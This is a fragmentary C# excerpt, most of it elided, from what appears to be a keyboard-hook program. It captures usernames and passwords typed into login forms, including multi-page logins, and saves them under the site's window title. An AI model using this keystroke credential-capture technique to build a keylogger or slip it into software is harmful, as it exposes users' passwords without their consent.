                    ...
                    if (isLoginForm)
                    {
                        ...
                        if (vkCode == VK_RETURN)
                        {
                            ...
                            if (!string.IsNullOrEmpty(capturedUsername) && !string.IsNullOrEmpty(capturedPassword))
                            {
                                ...
                                // Use lastWebsite for multi-page logins so we save with the original login page title
                                // (e.g., "youtube" on email page, not "Trần Huy" on password page)
                                string savedWebsite = !string.IsNullOrEmpty(lastWebsite) ? lastWebsite : windowTitle;
                            ...
                            {
                                // User entered username and pressed Enter on multi-page login site, likely going to password page
                                Log("[MULTI-PAGE LOGIN] Username captured on multi-page site, enabling multi-page mode for password page");
